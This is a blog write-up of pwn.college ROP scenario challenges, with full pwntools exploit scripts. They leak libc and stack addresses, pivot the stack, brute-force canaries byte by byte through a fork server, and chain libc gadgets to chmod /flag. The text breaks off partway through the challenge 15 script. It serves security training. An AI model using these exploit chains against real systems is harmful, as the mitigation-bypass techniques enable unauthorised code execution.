---
layout: post
title:  "Pwn College - ROP Scenarios"
date:   2024-05-17 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

This module teaches different exploitation scenarios involving ROP chains. \
Personally, I found most of the challenges within this module not challenging at all, with minimal learning benefit. \
However, challenges 13-15 were interesting, as they involved exploiting full-mitigation binary (NX, DEP, ASLR, and full RELRO) without any leak primitive - demanding some non trivial tricks. 

## CFI

Intel’s implementation of CFI mitigation is called CET, and already exists within new processors after 2020. \
The idea is simple - start the first instruction of every basic block of the program with a `endbr64` instruction. Upon performing any indirect jump, such as `ret, call rbx, jmp rcx` - the hardware automatically checks that the destination address contains the `endbr64` as its first instruction. If it doesn’t, the program crashes. \
This mitigation kills the option of concatenation of small gadgets, that usually reside by the end of basic blocks. However, we can still perform block-oriented programming or SROP technique. 

Notice that on non-CET processors, the `endbr64` instruction is just a `nop`.

## Challenge 1

No ROP yet, warming up.

```python
def main(): 
    elf = ELF(BINARY)
    win_addr = elf.symbols['win']

    for delta in range(-0x40, 0x40, 8):
        print(delta)

        p = process(BINARY)

        buf = b'A' * (0x48 + delta) + p64(win_addr)
        p.send(buf)
        time.sleep(0.1)
        data = p.recv()
        if b'pwn' in data:
            print(data)

if __name__ == '__main__':
    main()
```

## Challenge 2

Execute 2 functions, trivial. 

```python
def main(): 
    elf = ELF(BINARY)
    win_1_addr = elf.symbols['win_stage_1']
    win_2_addr = elf.symbols['win_stage_2']

    for delta in range(-0x40, 0x40, 8):
        p = process(BINARY)

        buf = b'A' * (56 + delta) + p64(win_1_addr) + p64(win_2_addr)
        p.send(buf)
        time.sleep(0.1)
        data = p.recv()
        if b'pwn' in data:
            print(data)
```

## Challenge 3

Execute 5 functions, use a gadget for each of them to control their argument.

```python
def main(): 
    elf = ELF(BINARY)
    win_1_addr = elf.symbols['win_stage_1']
    win_2_addr = elf.symbols['win_stage_2']
    win_3_addr = elf.symbols['win_stage_3']
    win_4_addr = elf.symbols['win_stage_4']
    win_5_addr = elf.symbols['win_stage_5']

    rop = ROP(BINARY)
    pop_rdi = rop.rdi.address

    for delta in range(-0x40, 0x40, 8):
        p = process(BINARY)
        buf = b'A' * (104 + delta)
        buf += p64(pop_rdi) + p64(1)
        buf += p64(win_1_addr) 
        buf += p64(pop_rdi) + p64(2)
        buf += p64(win_2_addr) 
        buf += p64(pop_rdi) + p64(3)
        buf += p64(win_3_addr)
        buf += p64(pop_rdi) + p64(4)
        buf += p64(win_4_addr)
        buf += p64(pop_rdi) + p64(5)
        buf += p64(win_5_addr)

        p.send(buf)
        time.sleep(0.1)
        data = p.recv()
        if b'pwn' in data:
            print(data)
```

## Challenge 4

Write `chmod` shellcode, and use stack leak to store the `"/flag\x00"` string. 

```python
def main(): 
    elf = ELF(BINARY)
    rop = ROP(BINARY)
    pop_rdi_ret = rop.find_gadget(['pop rdi']).address
    pop_rsi_ret = rop.find_gadget(['pop rsi']).address
    pop_rax_ret = rop.find_gadget(['pop rax']).address
    syscall_ret = rop.find_gadget(['syscall']).address

    print(f'syscall:{hex(syscall_ret)}')

    for delta in range(-0x50, 0x50, 8):
        #p = gdb.debug(BINARY, GDB_SCRIPT)
        p = process(BINARY)
        p.recvuntil(b'[LEAK] Your input buffer is located at: ')
        input_stack_addr = int(p.recv(14), 16)
        flag_addr = input_stack_addr + 0x200
        print(f'flag addr:{hex(flag_addr)}')

        buf = b'A' * (0x58 + delta)
        buf += p64(pop_rdi_ret)
        buf += p64(flag_addr)
        buf += p64(pop_rsi_ret)
        buf += p64(0xffff)
        buf += p64(0x4141414141414141)  # r15 crap
        buf += p64(pop_rax_ret)
        buf += p64(90)
        buf += p64(syscall_ret)
        buf += b'/flag\x00\x00\x00' * 0x100

        time.sleep(0.1)
        p.send(buf)

if __name__ == '__main__':
    main()
```

## Challenge 5

Now we have no stack leak, and we have no `push rsp` gadget or similar. We can use `puts` / `printf` trick in order to leak libc addresses, and also - stack addresses. 

A cool trick to retrieve stack address from libc is to leak the `environ` static variable value, which is a stack address. 

```python
from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from pwn import *
import os, sys
import struct
import time
import shutil
import signal

BINARY = glob('/challenge/baby*')[0]
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
GDB_SCRIPT= '''
b challenge
'''

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')


def main(): 
    elf = ELF(BINARY)
    libc = ELF(LIBC)
    # TODO: leak stack address via the printf, and restart the program
    elf_puts = elf.symbols['puts']
    elf_start = elf.symbols['_start']
    elf_puts_got = elf.got['puts']
    libc_environ = libc.symbols['environ']
    libc_puts = libc.symbols['puts']

    rop = ROP(BINARY)
    pop_rdi_ret = rop.find_gadget(['pop rdi']).address
    pop_rsi_ret = rop.find_gadget(['pop rsi']).address
    pop_rax_ret = rop.find_gadget(['pop rax']).address
    syscall_ret = rop.find_gadget(['syscall']).address
    leave_ret = rop.find_gadget(['leave']).address
    # interesting gadget - lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret

    for delta in range(-0x50, 0x50, 8):
        delta = 0
        # p = gdb.debug(BINARY, GDB_SCRIPT)
        p = process(BINARY)

        # PHASE 1 - leak libc address via puts
        buf_1 = b'A' * (104 + delta)
        buf_1 += p64(pop_rdi_ret)
        buf_1 += p64(elf_puts_got)
        buf_1 += p64(elf_puts)  # Call puts(puts_got) - leaking its libc address
        buf_1 += p64(elf_start)
        p.send(buf_1)
        time.sleep(0.2)
        p.recvuntil(b'Leaving!\n')  # TODO: check this on real exploit mode
        puts_addr_bytes = p.recv(6)
        
        puts_addr = int.from_bytes(puts_addr_bytes, "little")
        libc_base = puts_addr - libc_puts
        assert(libc_base & 0xfff == 0)
        libc_environ_addr = libc_base + libc_environ
        print(f'libc_environ_addr:{hex(libc_environ_addr)} libc_addr:{hex(libc_base)}')

        # PHASE 2 - using libc's environ, get a stack address
        buf_2 = b'A' * (104 + delta)
        buf_2 += p64(pop_rdi_ret)
        buf_2 += p64(libc_environ_addr)
        buf_2 += p64(elf_puts)  # Call puts(libc_environ) - leaking its libc address
        buf_2 += p64(elf_start)
        p.send(buf_2)
        time.sleep(0.2)
        p.recvuntil(b'Leaving!\n')
        environ_bytes = p.recv(6)
        elf_environ_addr = int.from_bytes(environ_bytes, "little")
        print(f'elf_environ_addr:{hex(elf_environ_addr)}')

        input_addr = elf_environ_addr - 648
        flag_addr = input_addr + 0x100
        
        # PHASE 3 - trigger a shellcode
        buf_3 = b'A' * (104 + delta)
        buf_3 += p64(pop_rdi_ret)
        buf_3 += p64(flag_addr)
        buf_3 += p64(pop_rsi_ret)
        buf_3 += p64(0xffff)
        buf_3 += p64(0x4141414141414141)  # r15 crap
        buf_3 += p64(pop_rax_ret)
        buf_3 += p64(90)
        buf_3 += p64(syscall_ret)
        buf_3 += b'/flag\x00\x00\x00' * 0x100
        p.send(buf_3)
        time.sleep(0.2)
        

if __name__ == '__main__':
    main()
```

So this is a 3-phase shellcode:

First, leaks libc address and restarts the program by jumping to `_start`. Afterwards, triggers the vuln once again and reads `libc.environ` value, retrieving the stack’s address, and restarting the program. 
Finally, jumps to syscall gadget and chmods the flag to readable permissions.

## Challenge 6

Similar to 5, now there’s no `syscall` gadget, nor `pop rax`. Simply retrieve them from libc. \
For simplicity, I’ve used `chmod` symbol located within libc, which is just a wrapper for the chmod syscall.

```python
from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from pwn import *
import os, sys
import struct
import time
import shutil
import signal

BINARY = glob('/challenge/baby*')[0]
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
GDB_SCRIPT= '''
b challenge
'''

context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')


def main(): 
    elf = ELF(BINARY)
    libc = ELF(LIBC)
    # TODO: leak stack address via the printf, and restart the program
    elf_puts = elf.symbols['puts']
    elf_start = elf.symbols['_start']
    elf_puts_got = elf.got['puts']
    libc_environ = libc.symbols['environ']
    libc_puts = libc.symbols['puts']
    libc_chmod = libc.symbols['chmod']

    rop = ROP(BINARY)
    pop_rdi_ret = rop.find_gadget(['pop rdi']).address
    pop_rsi_ret = rop.find_gadget(['pop rsi']).address

    libc_rop = ROP(LIBC)

    if rop:
        # p = gdb.debug(BINARY, GDB_SCRIPT)
        p = process(BINARY)

        delta = 0
        # PHASE 1 - leak libc address via puts
        buf_1 = b'A' * (104 + delta)
        buf_1 += p64(pop_rdi_ret)
        buf_1 += p64(elf_puts_got)
        buf_1 += p64(elf_puts)  # Call puts(puts_got) - leaking its libc address
        buf_1 += p64(elf_start)
        p.send(buf_1)
        time.sleep(0.2)
        p.recvuntil(b'Leaving!\n')  # TODO: check this on real exploit mode
        puts_addr_bytes = p.recv(6)
        
        puts_addr = int.from_bytes(puts_addr_bytes, "little")
        libc_base = puts_addr - libc_puts
        assert(libc_base & 0xfff == 0)
        libc_environ_addr = libc_base + libc_environ
        libc_chmod_addr = libc_base + libc_chmod
        print(f'libc_environ_addr:{hex(libc_environ_addr)} libc_addr:{hex(libc_base)} libc_chmod_addr:{hex(libc_chmod_addr)}')

        # PHASE 2 - using libc's environ, get a stack address
        buf_2 = b'A' * (104 + delta)
        buf_2 += p64(pop_rdi_ret)
        buf_2 += p64(libc_environ_addr)
        buf_2 += p64(elf_puts)  # Call puts(libc_environ) - leaking its libc address
        buf_2 += p64(elf_start)
        p.send(buf_2)
        time.sleep(0.2)
        p.recvuntil(b'Leaving!\n')
        environ_bytes = p.recv(6)
        elf_environ_addr = int.from_bytes(environ_bytes, "little")
        print(f'elf_environ_addr:{hex(elf_environ_addr)}')

        input_addr = elf_environ_addr - 648
        flag_addr = input_addr + 0x200
        
        # PHASE 3 - trigger a shellcode
        buf_3 = b'A' * (104 + delta)
        buf_3 += p64(pop_rdi_ret)
        buf_3 += p64(flag_addr)
        buf_3 += p64(pop_rsi_ret)
        buf_3 += p64(0xffff)
        buf_3 += p64(0x4242424242424242)  # r15 crap
        buf_3 += p64(libc_chmod_addr)
        buf_3 += b'/flag\x00\x00\x00' * 0x100  # a is a symlink to /flag
        p.send(buf_3)

        # p.interactive()
        time.sleep(0.2)
        

if __name__ == '__main__':
    main()
```

## Challenge 7

Same solution as above.

## Challenge 8

Same. 

## Challenge 9

Now we can only perform short partial writes, of 24 bytes, into the stack. Hence, the required solution involves stack pivoting. 

Notice that the shellcode is copied to the .bss. This means we may pivot the `rbp` value into deterministic shellcode address within the .bss. \
My trick is to use `leave; ret` gadget. Recall leave is actually the same as `mov rsp, rbp; pop rbp`. Moreover, we would also use the `pop rbp` gadget, in addition to the above. 

```python
def main(): 
    shellcode = 0x4150e0
    elf = ELF(BINARY)
    libc = ELF(LIBC)
    # TODO: leak stack address via the printf, and restart the program
    elf_bin_padding = elf.symbols['bin_padding']
    elf_puts = elf.symbols['puts']
    elf_start = elf.symbols['_start']
    elf_puts_got = elf.got['puts']
    libc_environ = libc.symbols['environ']
    libc_puts = libc.symbols['puts']
    libc_chmod = libc.symbols['chmod']

    rop = ROP(BINARY)
    pop_rdi_ret = rop.find_gadget(['pop rdi']).address
    pop_rsi_ret = rop.find_gadget(['pop rsi']).address
    leave_ret = rop.find_gadget(['leave']).address

    libc_rop = ROP(LIBC)

    if rop:
        # p = gdb.debug(BINARY, GDB_SCRIPT)
        p = process(BINARY)
        time.sleep(0.2)
        p.recv()

        pop_rbp_ret = elf_bin_padding + 0x30
        # PHASE 1.0 - pivot stack
        buf_1 = b''
        buf_1 += p64(pop_rbp_ret)
        buf_1 += p64(shellcode + 24)
        buf_1 += p64(leave_ret)
        buf_1 += p64(0x4141414141414141)  # newer rbp value

        # PHASE 1.1 - leak libc adderss 
        buf_1 += p64(pop_rdi_ret)
        buf_1 += p64(elf_puts_got)
        buf_1 += p64(elf_puts)  # Call puts(puts_got) - leaking its libc address
        buf_1 += p64(elf_start)  # Restart program
        p.send(buf_1)
        time.sleep(0.2)
        p.recvuntil(b'Leaving!\n')  # TODO: check this on real exploit mode
        puts_addr_bytes = p.recv(6)
        puts_addr = int.from_bytes(puts_addr_bytes, "little")
        libc_base = puts_addr - libc_puts
        assert(libc_base & 0xfff == 0)
        libc_environ_addr = libc_base + libc_environ
        libc_chmod_addr = libc_base + libc_chmod
        print(f'libc_base:{hex(libc_base)}')

        # PHASE 2.0 - pivot stack
        buf_2 = b''
        buf_2 += p64(pop_rbp_ret)
        buf_2 += p64(shellcode + 24)
        buf_2 += p64(leave_ret)
        buf_2 += p64(0x4141414141414141)  # newer rbp value

        # PHASE 2.1 - trigger chmod
        flag_addr = shellcode + 0x100
        buf_2 += p64(pop_rdi_ret)
        buf_2 += p64(flag_addr)
        buf_2 += p64(pop_rsi_ret)
        buf_2 += p64(0xffff)
        buf_2 += p64(0x4242424242424242)  # r15 crap
        buf_2 += p64(libc_chmod_addr)
        buf_2 += b'/flag\x00\x00\x00' * 0x100
        p.send(buf_2)
        time.sleep(0.2)
        

if __name__ == '__main__':
    main()
```

## Challenge 10

Now, the binary is also PIE. We would now perform partial write, pivoting the stack, in order to execute win. 

This challenge is tricky - while this seems like some kinda trivial stack pivoting, upon returning from challenge into main’s frame, the function pointer of `win`, which is located on the stuck, is corrupted by the preceding `puts` call. Hence we are required to overwrite the LSB of main’s return address, so that we would skip that puts call. 

```python
def main(): 
        # p = gdb.debug(BINARY, GDB_SCRIPT)
        p = process(BINARY)
        time.sleep(0.2)
        p.recvuntil(b'is located at: ')
        input_addr = int(p.recv(14), 16)
        print(f'input_addr:{hex(input_addr)}')

        # PHASE 1.0 - pivot stack
        buf_1 = b'\x41' * 104
        buf_1 += p64(input_addr - 0x10)  # new value for rbp, that will be set by main's 'leave'
        buf_1 += b'\x91' # VERY tricky - skip the puts call, as it corrupts the fp located on the stack! directly return into main's 'leave'
        p.send(buf_1)

        p.interactive()

if __name__ == '__main__':
    main()
```

## Challenge 11

Same.

## Challenge 12

Similar to the above, but this time `challenge` is inlined to `main`. This means it doesn’t opens another stack frame, and the return address is actually `__libc_start_main` - which is a libc address, not part of the loaded program address space. 

My approach is similar - i’d overwrite the return address of main. his means we have to jump back to somewhere within libc, hopefully a nearby `leave; ret` gadget. \
The simplest approach was to brute force 12 bits of the `leave;ret` gadget within libc. 

```python
    while True:
        with process(BINARY) as p:
            # p = gdb.debug(BINARY, GDB_SCRIPT)
            # p = process(BINARY)
            p.recvuntil(b'is located at: ')
            input_addr = int(p.recv(14), 16)

            # PHASE 1.0 - pivot stack
            buf_1 = b'\x41' * 0x98
            buf_1 += p64(input_addr - 0x10)  # new value for rbp, that will be set by main's 'leave'
            buf_1 += b'\xc8\x08\xa1'  # very tricky - skip the puts call, as it corrupts the fp located on the stack! directly return into main's 'leave'
            p.send(buf_1)
            p.recvuntil(b'Goodbye!')

            data = p.recv()
            print(f'data:{data}')
```

## Challenge 13

Now there's also a canary. However, we're given arbitrary read primitive. \
But now, theres no `win` method, nor interesting gadgets within the binary. This means that we have to perform the exploitation within libc gadgets. 

However, recall we have either canary leak or libc leak, not both. Moreover, we can try 12-bit BF the return address of main (towards `__libc_start_main`), in order to try to restart the binary - but it won’t help us - as `__libc_start_main` expects the `rdi` register to contain the address of main, which is corrupted within the return context of main. 

This means the only option that allows us to restart the binary, is by jumping back to `_start`. But we can either request canary leak off the stack, OR elf pie base leak, not both! And in order to corrupt a return address, we MUST retrieve the canary first. 

Problem. 

he solution is abit creative - notice that while main’s return address is `__libc_start_main`, the latter’s return address is `_start`. This means it resides somewhere on the stack too. \
This is `0x80` bytes after the input buffer. 

By pivoting the stack address to that place, we can easily jump back to `_start`, leaking a libc address, and pwning the binary using regular libc gadgets. 

This is the layout right before calling ret from main:

```bash
Breakpoint 2, 0x0000562de165b1f5 in main ()
(gdb) x/20gx $rsp
0x7fffd4a7f3c8: 0x00007f304672f083      0x00007f3047967620
0x7fffd4a7f3d8: 0x00007fffd4a7f4b8      0x0000000100000000
0x7fffd4a7f3e8: 0x0000562de165af02      0x0000562de165b200
0x7fffd4a7f3f8: 0xf1b72a34ff7e7dbf      0x0000562de165a200
0x7fffd4a7f408: 0x00007fffd4a7f4b0      0x0000000000000000
```

This means if we can find a libc gadget that would pop 6 qwords off the stack, `rsp` would point towards `0x0000562de165a200`, which is `_start`. \
However, there’s no gadget that pops 6 qwords off the stack, at least not near `0x00007f304672f083`, and we cannot call multiple gadgets, as we dont have any libc leak. Again, problem.

What we can do - is to use `pop rsp, ret` gadget. We can set `rsp` to our desired stack address, `0x7fffd4a7f3f0` in the above example. 
The nearest pop rsp gadget resides at 0x23b64 within the provided libc, hence requires 1 byte libc address BF. But recall we can't write past the fake libc return address! hence, this gadget won't help us too.

Instead, we can just BF 3 bytes, jumping to the `leave; ret` gadget within libc. 

```python
def main(): 
    elf = ELF(BINARY)
    libc = ELF(LIBC)
    elf_bin_padding = elf.symbols['bin_padding']
    elf_puts = elf.symbols['puts']
    elf_start = elf.symbols['_start']
    elf_puts_got = elf.got['puts']
    libc_environ = libc.symbols['environ']
    libc_puts = libc.symbols['puts']
    libc_chmod = libc.symbols['chmod']

    rop = ROP(BINARY)
    pop_rdi_ret = rop.find_gadget(['pop rdi']).address
    pop_rsi_ret = rop.find_gadget(['pop rsi']).address
    leave_ret = rop.find_gadget(['leave']).address

    libc_rop = ROP(LIBC)
    libc_leave_ret = libc_rop.find_gadget(['leave']).address
    libc_pop_rdi_ret = 0x23b6a  # libc_rop.find_gadget(['pop rdi']).address
    libc_pop_rsi_ret = 0x2601f  # libc_rop.find_gadget(['pop rsi']).address
    # interesting gadget - lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
    padding = 0x38

    while True:
        with process(BINARY) as p:
            try:
                # p = gdb.debug(BINARY, GDB_SCRIPT)
                # p = process(BINARY)
                time.sleep(0.05)

                # PHASE 0 - leak canary value
                p.recvuntil(b'is located at: ')
                input_addr = int(p.recv(14), 16)
                canary_address = hex(input_addr + padding)
                p.sendline(canary_address)
                p.recvuntil(b' = ')
                canary = int(p.recv(18), 16)
                assert(canary & 0xff == 0)
                print(f'canary:{hex(canary)}')
            
                # PHASE 1.0 - pivot stack
                buf_1 = b'\x41' * padding
                buf_1 += p64(canary)
                buf_1 += p64(input_addr + 0x80 - 8)  # new value for rbp, which will be rsp soon. point towards the _start fp within the stack        
                buf_1 += b'\xc8\xc8\x63'  # leave; ret - 0x578c8. BF of 3 bytes
                p.send(buf_1)

                # PHASE 2.0 - leak libc value
                time.sleep(0.05)
                p.recvuntil(b'is located at: ')
                input_addr = int(p.recv(14), 16)
                ra_address = hex(input_addr + padding + 0x10)  # ra points to libc
                p.sendline(ra_address)
                p.recvuntil(b' = ')
                libc_leak = int(p.recv(18), 16)
                libc_base = libc_leak - 0x24083
                assert(libc_base & 0xfff == 0)
                print(f'libc_base:{hex(libc_base)}')

                # PHASE 3 - trigger libc gadgets
                pop_rdi_ret = libc_base + libc_pop_rdi_ret
                pop_rsi_ret = libc_base + libc_pop_rsi_ret
                libc_chmod_addr = libc_base + libc_chmod
                flag_addr = input_addr + 0x100
                buf_3 = b'\x41' * padding
                buf_3 += p64(canary)
                buf_3 += p64(0x4242424242424242)  # new value for rbp     
                buf_3 += p64(pop_rdi_ret)  # pop rdi; ret
                buf_3 += p64(flag_addr)
                buf_3 += p64(pop_rsi_ret)  # pop rsi; ret
                buf_3 += p64(0xffff)
                buf_3 += p64(libc_chmod_addr)  # chmod call
                buf_3 += b'/flag\x00\x00\x00' * 0x50
                p.send(buf_3)
                p.recvuntil(b'Goodbye!')

            except Exception as e:
                pass


if __name__ == '__main__':
    main()
```

## Challenge 14

Now wer’e given a fork server. Moreover, we no longer have read primitive. So we have PIE, canary, NX, full RELRO, and no leak primitives at all. Great.

However, notice this time we do have `challenge` call. This means challenge’s return address is within the program’s loaded memory space. Hence, we can for example execute `_start` once again, but this time with some adjusted `rbp` value. (challenge 15 will be similar, but without that challenge call. Therefore it worth making the exploit as generic as possible). 

This exploit will have multiple stages:

1. Leak the canary byte-by-byte manner. Each calling process will try to corrupt the next byte of the canary, and check for crash. If it didnt crash - canary byte was found. 

2. Leak PIE base (optional for challenge 14 only)

3. Leak libc value. We can overwrite return addresses, and `challenge`’s in particular. This is `main`, which is part of the program. We can do smart brute force here too - we would overwrite the return address byte after byte, to some indicative function, such as `__stack_chk_fail`. Upon hit, we would get indicative stdout (stack corruption detected error). Otherwise, the process should crash without any special notification. 

4. Leak stack value. We can do this easily having libc, as `environ` is a symbol that always exists and contains a process stack’s address. 

I've used the `__stack_chk_fail` as an oracle, because it exists both on the binary as a wrapepr (adequate for challenge 14) and both on libc (adequate for challenge 15). 

```python
from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from pwn import *
import os, sys
import struct
import time
import shutil
import signal
BINARY = glob('/challenge/baby*')[0]
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
GDB_SCRIPT= '''
set follow-fork-mode child
b *challenge+383
c
'''
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')
elf = ELF(BINARY)
libc = ELF(LIBC)
elf_bin_padding = elf.symbols['bin_padding']
elf_stack_chk = elf.symbols['__stack_chk_fail']
elf_puts = elf.symbols['puts']
elf_start = elf.symbols['_start']
elf_puts_got = elf.got['puts']
libc_environ = libc.symbols['environ']
libc_stack_chk = libc.symbols['__stack_chk_fail']
libc_puts = libc.symbols['puts']
libc_chmod = libc.symbols['chmod']
rop = ROP(BINARY)
libc_rop = ROP(LIBC)
pop_rdi_ret = rop.find_gadget(['pop rdi']).address
pop_rsi_ret = rop.find_gadget(['pop rsi']).address
leave_ret = rop.find_gadget(['leave']).address
libc_leave_ret = libc_rop.find_gadget(['leave']).address
libc_pop_rdi_ret = 0x23b6a  # libc_rop.find_gadget(['pop rdi']).address
libc_pop_rsi_ret = 0x2601f  # libc_rop.find_gadget(['pop rsi']).address


def leak_canary(padding):
    current_buf = b'A' * padding
    while len(current_buf) < padding + 8:
        for num in range(256):
            with remote('0.0.0.0', 1337) as p:
                candidate = current_buf + num.to_bytes(1, 'little')
                p.send(candidate)
                p.recvuntil(b'Leaving!')
                #time.sleep(0.1)
                output = p.recv()
                if b'*** stack smashing detected ***' not in output and b'Goodbye!' in output:
                    print(f'NEW CANARY BYTE FOUND:{num}')
                    current_buf = candidate
                    break
    return current_buf[-8:]

def leak_pie(padding, canary):
    # TODO - The call site of __stack_chk_fail is located at offset 0x1b27
    current_buf = b'\x41' * padding + canary + b'\x42' * 8
    current_buf += b'\x27'
    iter = 0
    while len(current_buf) < padding + 16 + 8:
        iter += 1
        for num in range(256):
            if num & 0xf != 0x0b and iter == 1:  # specialization for first searched byte, as it is half-known
                continue
            with remote('0.0.0.0', 1337) as p:
                candidate = current_buf + num.to_bytes(1, 'little')
                p.send(candidate)
                p.recvuntil(b'Leaving!')
                output = p.recv()
                print(f'OUTPUT:{output}')
                if b'*** stack smashing detected ***' in output and b'Goodbye!' not in output:
                    print(f'NEW RA BYTE FOUND:{num}')
                    current_buf = candidate
                    break
    return current_buf[-8:]

def read_addr(padding, canary, pie_base, addr):
    buf = b'\x41' * padding + canary + b'\x42' * 8
    buf += struct.pack('<Q', pie_base + pop_rdi_ret)  
    buf += struct.pack('<Q', addr)
    buf += struct.pack('<Q', pie_base + elf_puts)
    with remote('0.0.0.0', 1337) as p:
        p.send(buf)
        time.sleep(0.2)
        p.recvuntil(b'Leaving!\n')
        result = p.recv()[:-1]
    return result

def leak_libc(padding, canary, pie_base):
    puts_libc_leak = int.from_bytes(read_addr(padding, canary, pie_base, elf_puts_got + pie_base), 'little')
    return puts_libc_leak - libc_puts

def leak_stack(padding, canary, pie_base, libc_base):
    environ = int.from_bytes(read_addr(padding, canary, pie_base, libc_base + libc_environ), 'little')
    return environ

def run_chmod(padding, canary, pie_base, libc_base, stack_val):
    pop_rdi_ret = libc_base + libc_pop_rdi_ret
    pop_rsi_ret = libc_base + libc_pop_rsi_ret
    libc_chmod_addr = libc_base + libc_chmod
    flag_addr = stack_val  # TODO: check this
    buf_3 = b'\x41' * padding
    buf_3 += canary
    buf_3 += p64(0x4242424242424242)  # new value for rbp     
    buf_3 += p64(pop_rdi_ret)  # pop rdi; ret
    buf_3 += p64(flag_addr)
    buf_3 += p64(pop_rsi_ret)  # pop rsi; ret
    buf_3 += p64(0xffff)
    buf_3 += p64(libc_chmod_addr)  # chmod call
    buf_3 += b'/flag\x00\x00\x00' * 0x50
    with remote('0.0.0.0', 1337) as p:
        p.send(buf_3)
        time.sleep(0.5)
        p.recvuntil(b'Leaving!')

def main(): 
    padding = 0x18  # TODO: change this
    if False:
        p0 = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
        p0 = process(BINARY)
        time.sleep(2)
        p1 = remote('0.0.0.0', 1337)
        p1.send(b'\x41' * 0x18)
        p0.interactive()
    if True:
        canary = leak_canary(padding)
        pie_base = leak_pie(padding, canary)
        pie_base = int.from_bytes(pie_base, "little") - 0x1b27  # TODO: adapt this
        print(f'canary = {hex(int.from_bytes(canary, "little"))}')
        print(f'pie_base = {hex(pie_base)}')
        assert(pie_base & 0xfff == 0)
        libc_base = leak_libc(padding, canary, pie_base)
        assert(libc_base & 0xfff == 0)
        stack_val = leak_stack(padding, canary, pie_base, libc_base)
        print(f'canary = {hex(int.from_bytes(canary, "little"))}')
        print(f'pie_base = {hex(pie_base)}')
        print(f'libc_base = {hex(libc_base)}') 
        print(f'stack_val = {hex(stack_val)}')
        run_chmod(padding, canary, pie_base, libc_base, stack_val)
        exit()


if __name__ == '__main__':
    main()
```

## Challenge 15

Same as 14, but this time no `challenge` frame is being opened - hence the overwritten return address is a libc pointer. We can try to use a similar method, and overwrite bytes until `__stack_chk_fail` is hit, but this time we would use libc’s symbol. 

Notice we first have to do 12-bit bruteforce of libc address, as the relative offset of `__stack_chk_fail` within libc, compared to `__libc_start_main`, are 3 bytes away. 12 LSbs are deterministic, hence 12 bit BF.

```python
from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from pwn import *
import os, sys
import struct
import time
import shutil
import signal
BINARY = glob('/challenge/baby*')[0]
LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
GDB_SCRIPT= '''
set follow-fork-mode child
b *challenge+383
c
'''
context.terminal = ['/run/workspace/bin/xfce4-terminal', '-e']
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')
elf = ELF(BINARY)
libc = ELF(LIBC)
elf_bin_padding = elf.symbols['bin_padding']
elf_stack_chk = elf.symbols['__stack_chk_fail']
elf_puts = elf.symbols['puts']
elf_start = elf.symbols['_start']
elf_puts_got = elf.got['puts']
libc_environ = libc.symbols['environ']
libc_stack_chk = libc.symbols['__stack_chk_fail']
libc_puts = libc.symbols['puts']
libc_chmod = libc.symbols['chmod']
rop = ROP(BINARY)
libc_rop = ROP(LIBC)
pop_rdi_ret = rop.find_gadget(['pop rdi']).address
pop_rsi_ret = rop.find_gadget(['pop rsi']).address
leave_ret = rop.find_gadget(['leave']).address
libc_leave_ret = libc_rop.find_gadget(['leave']).address
libc_pop_rdi_ret = 0x23b6a  # libc_rop.find_gadget(['pop rdi']).address
libc_pop_rsi_ret = 0x2601f  # libc_rop.find_gadget(['pop rsi']).address


def leak_canary(padding):
    current_buf = b'A' * padding
    while len(current_buf) < padding + 8:
    # if True:
        for num in range(256):
            with remote('0.0.0.0', 1337) as p:
                candidate = current_buf + num.to_bytes(1, 'little')
                p.send(candidate)
                try:
                    output = p.recvuntil(b'*** stack smashing detected ***', timeout=9)
                except Exception:
                    output = None
                
                if not output:
                    print(f'NEW CANARY BYTE FOUND:{num}')
                    current_buf = candidate
                    break
    return current_buf[-8:]

def leak_top_bytes(buf):
    current_buf = buf
    candidates = []

    for num2 in range(256):
        for num1 in range(256):
            if num1 & 0xf != 0x0c:  # specialization for first searched byte, as it is half-known
                continue
            with remote('0.0.0.0', 1337) as p:
                candidate = current_buf + num1.to_bytes(1, 'little') + num2.to_bytes(1, 'little')
                p.send(candidate)
                try:
                    output = p.recvuntil(b'*** stack smashing detected ***', timeout=9)
                except Exception:
                    output = None

                if output:
                    print(f'NEW RA BYTES FOUND: {num1} {num2}')
                    # candidates.append((num1, num2))
                    current_buf = candidate
                    return current_buf

def leak_libc(padding, canary):
    # TODO - The call site of __stack_chk_fail is located at offset 0x12fc90
    current_buf = b'\x41' * padding + canary + b'\x42' * 8
    current_buf += b'\x90'
    current_buf = leak_top_bytes(current_buf)

    while len(current_buf) < padding + 16 + 8:
        for num in range(256):
            with remote('0.0.0.0', 1337) as p:
                candidate = current_buf + num.to_bytes(1, 'little')
                p.send(candidate)
                try:
                    output = p.recvuntil(b'*** stack smashing detected ***', timeout=9)
                except Exception:
                    output = None
                if output:
                    print(f'NEW RA BYTE FOUND:{num}')
                    current_buf = candidate
                    break
    return current_buf[-8:]

def read_addr(padding, canary, libc_base, addr):
    buf = b'\x41' * padding + canary + b'\x42' * 8
    buf += struct.pack('<Q', libc_base + libc_pop_rdi_ret)  # TODO: adapt this to libc offset
    buf += struct.pack('<Q', addr)
    buf += struct.pack('<Q', libc_base + libc_puts)  
    with remote('0.0.0.0', 1337) as p:
        p.send(buf)
        p.recvuntil(b'Goodbye!\n')
        time.sleep(0.2)
        result = p.recv()[:-1]
        
    return result


def leak_stack(padding, canary, libc_base):
    environ = int.from_bytes(read_addr(padding, canary, libc_base, libc_base + libc_environ), 'little')
    return environ

def run_chmod(padding, canary, libc_base, stack_val):
    pop_rdi_ret = libc_base + libc_pop_rdi_ret
    pop_rsi_ret = libc_base + libc_pop_rsi_ret
